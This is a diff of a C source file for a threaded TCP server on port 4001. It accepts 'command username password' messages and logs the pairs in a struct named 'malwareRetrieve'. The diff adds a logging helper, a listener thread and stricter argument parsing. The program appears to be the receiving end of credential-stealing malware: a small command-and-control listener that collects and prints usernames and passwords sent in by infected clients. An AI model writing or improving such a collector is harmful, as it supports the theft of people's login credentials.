@@ -7,77 +7,82 @@
 #include <pthread.h>
 #include <time.h>
 #include <arpa/inet.h>
-
+#include "server.h"
+#include <stdarg.h>
 
 // dont forget about too many conn and dos!!
 
 
-char api[7] = "command";
 int socketfd;
 struct sockaddr_in addr;
 struct sockaddr_in client_addr;
-
-
-typedef struct infoclient {
-  int client;
-  char ip[INET_ADDRSTRLEN];
-} infoclient;
-
-typedef struct malwareRetrieve{
-  char username[64];
-  char password[64];
-  char ipaddr[INET_ADDRSTRLEN];
-} malwareRetrieve;
-
   
+void printLog(char *msg, ...){
+  printf("\33[2K\r");
+  va_list args;
+  va_start(args, msg);
+  vprintf(msg, args);
+  va_end(args);
+  printf("Interact ->");
+  fflush(stdout);  
+  // printf("%s", msg);
+  
+}
+
 void *handleClient(void *arg){
   infoclient *client = (infoclient*)  arg;
-  printf("id: %d - from: %s - Connexion established and is being handled !\n", client->client, client->ip);
+  printLog("[LOG][id: %d - from: %s] Connexion established and is being handled !\n", client->client, client->ip);
   while (1) {
     // Check if con is alive
     char msg[64] = "check if conn is alive\n";
     if (write(client->client, msg, sizeof(msg)) != sizeof(msg)){
-      printf("conn is dead\n");
+      printLog("conn is dead\n");
       break;
     }
     char buffer[512];
     if (recv(client->client, buffer, sizeof(buffer), 0) != -1) {
       buffer[strcspn(buffer, "\r\n")] = '\0';
-      printf("id: %d - from: %s - Message received is %s \n",client->client, client->ip, buffer);
-      char *clientinput = strtok(buffer, " ");
-      if (strncmp(clientinput, api, sizeof(api)) == 0 ) {
+      printLog("[LOG][id: %d - from: %s] Message received is %s \n",client->client, client->ip, buffer);
+      char *saveTOK;
+      char *clientinput = strtok_r(buffer, " ", &saveTOK);
+      if (strncmp(clientinput, API_COMMAND, sizeof(API_COMMAND)) == 0 ) {
         malwareRetrieve current;
-        clientinput = strtok(NULL, " ");
+        clientinput = strtok_r(NULL, " ", &saveTOK);
         if (clientinput != NULL) {
           strncpy(current.username, clientinput, 64);
-          clientinput = strtok(NULL, " ");
+          clientinput = strtok_r(NULL, " ", &saveTOK);
           if (clientinput != NULL) {
+            if (strtok_r(NULL, " ", &saveTOK) != NULL) {
+              // Too many arguments!
+              printLog("[LOG][id: %d - from: %s] too many arguments!\n", client->client, client->ip);
+              break;
+            }
             strncpy(current.password, clientinput, 64);
-            printf("id: %d - from: %s - Successfull connexion to the command\n --> Username: %s, Password: %s ! \n", client->client, client->ip, current.username, current.password);
+            printLog("[LOG][id: %d - from: %s] Successfull connexion to the command\n --> Username: %s, Password: %s ! \n", client->client, client->ip, current.username, current.password);
             strncpy(current.ipaddr, client->ip, 16);
             close(client->client);
             free(client);
             return NULL;
           }
           else {
-              printf("id: %d - from: %s - Wrong api calls!\n", client->client, client->ip);
+              printLog("[LOG][id: %d - from: %s] Wrong api calls!\n", client->client, client->ip);
               break;
           }
         }
         else {
-            printf("id: %d - from: %s - Wrong api calls !\n", client->client, client->ip);
+            printLog("[LOG][id: %d - from: %s] Wrong api calls !\n", client->client, client->ip);
             break;
         }
       }
       else {
-        printf("id: %d - from: %s - Connexion to the server without api args, exit!!\n", client->client, client->ip);
+        printLog("[LOG][id: %d - from: %s] Received wrong arguments !\n", client->client, client->ip);
         break;
       }
            
     }
 
   }
-
+  printLog("[LOG][id: %d - from: %s] Transaction finished, closing connexion.\n", client->client, client->ip);
   close(client->client);
   free(client);
 
@@ -85,26 +90,9 @@ void *handleClient(void *arg){
   return NULL;
 }
 
-int main(){
-  printf("Starting the server program\n");
-  // Initialise a socket
-  int socketfd = socket(AF_INET, SOCK_STREAM, 0);
-  if (socketfd == -1) {
-    printf("Error code -1 - Failed to initialise a socket ");
-  }
-  addr.sin_family = AF_INET; // Address on local system
-  addr.sin_port = htons(4001); // Port on local system
-  addr.sin_addr.s_addr = INADDR_ANY; // Check more available options ??
-  if (bind(socketfd, (const struct sockaddr *) &addr, sizeof(addr)) == -1){
-    printf("Error code -1 -  in binding the port \n");
-    exit(-1);
-  }
-  if (listen(socketfd, 10) == -1) {
-    printf("Error code -1 - Failed to set the socket to listen \n");
-    exit(-1);
-  }
-
-  printf("Socket binded and listening !\nWaiting for new connexion...\n");
+void *ListenToClient(void *arg){
+  int socketfd = *(int*) arg;
+  printLog("[LOG] Socket binded and listening !\n[LOG] Waiting for new connexion...\n");
   while (1) {
     struct sockaddr_in client_addr;
     socklen_t client_len = sizeof(client_addr);
@@ -112,19 +100,55 @@ int main(){
     infoclient *client  = malloc(sizeof(infoclient));
     client->client = newsocket; 
     inet_ntop(AF_INET, &client_addr.sin_addr, client->ip , sizeof(client->ip));
-    // printf("id: %d - from: %s - New connexion established !\n",client->client ,client->ip);
     pthread_t newthread;
     pthread_create(&newthread, NULL, handleClient, client);
     pthread_detach(newthread);
-
-  //   // char msg[64] = "Successfull connexion, goodbye now!\n";
-  //   if (write(newsocket, msg, sizeof(msg)) == sizeof(msg)){
-  //     printf("Success, message has been correctly send\n");
-  //   }
-  //   else {
-  //     printf("Error - Return does not match the size of the message\n");
-  //   }
-  //   close(newsocket);
   }
+
+  
+}
+
+
+
+
+int main(){
+  printLog("[STARTING] Starting the server program\n");
+  // Initialise a socket
+  int socketfd = socket(AF_INET, SOCK_STREAM, 0);
+  if (socketfd == -1) {
+    printLog("[LOG] Error code -1 - Failed to initialise a socket ");
+  }
+  addr.sin_family = AF_INET; // Address on local system
+  addr.sin_port = htons(4001); // Port on local system
+  addr.sin_addr.s_addr = INADDR_ANY; // Check more available options ??
+  if (bind(socketfd, (const struct sockaddr *) &addr, sizeof(addr)) == -1){
+    printLog("[LOG] Error code -1 -  in binding the port \n");
+    exit(-1);
+  }
+  if (listen(socketfd, 10) == -1) {
+    printLog("[LOG] Error code -1 - Failed to set the socket to listen \n");
+    exit(-1);
+  }
+
+  pthread_t mainLoop;
+  pthread_create(&mainLoop, NULL, ListenToClient, &socketfd);
+  printf("Interact -> ");
+  while (1) {
+    // printf("Interact -> ");
+    char buffer[64];
+    fgets(buffer, sizeof(buffer), stdin);
+  }
+  // printf("Socket binded and listening !\nWaiting for new connexion...\n");
+  // while (1) {
+  //   struct sockaddr_in client_addr;
+  //   socklen_t client_len = sizeof(client_addr);
+  //   int newsocket = accept(socketfd, (struct sockaddr *) &client_addr, &client_len);
+  //   infoclient *client  = malloc(sizeof(infoclient));
+  //   client->client = newsocket; 
+  //   inet_ntop(AF_INET, &client_addr.sin_addr, client->ip , sizeof(client->ip));
+  //   pthread_t newthread;
+  //   pthread_create(&newthread, NULL, handleClient, client);
+  //   pthread_detach(newthread);
+  // }
 
 }
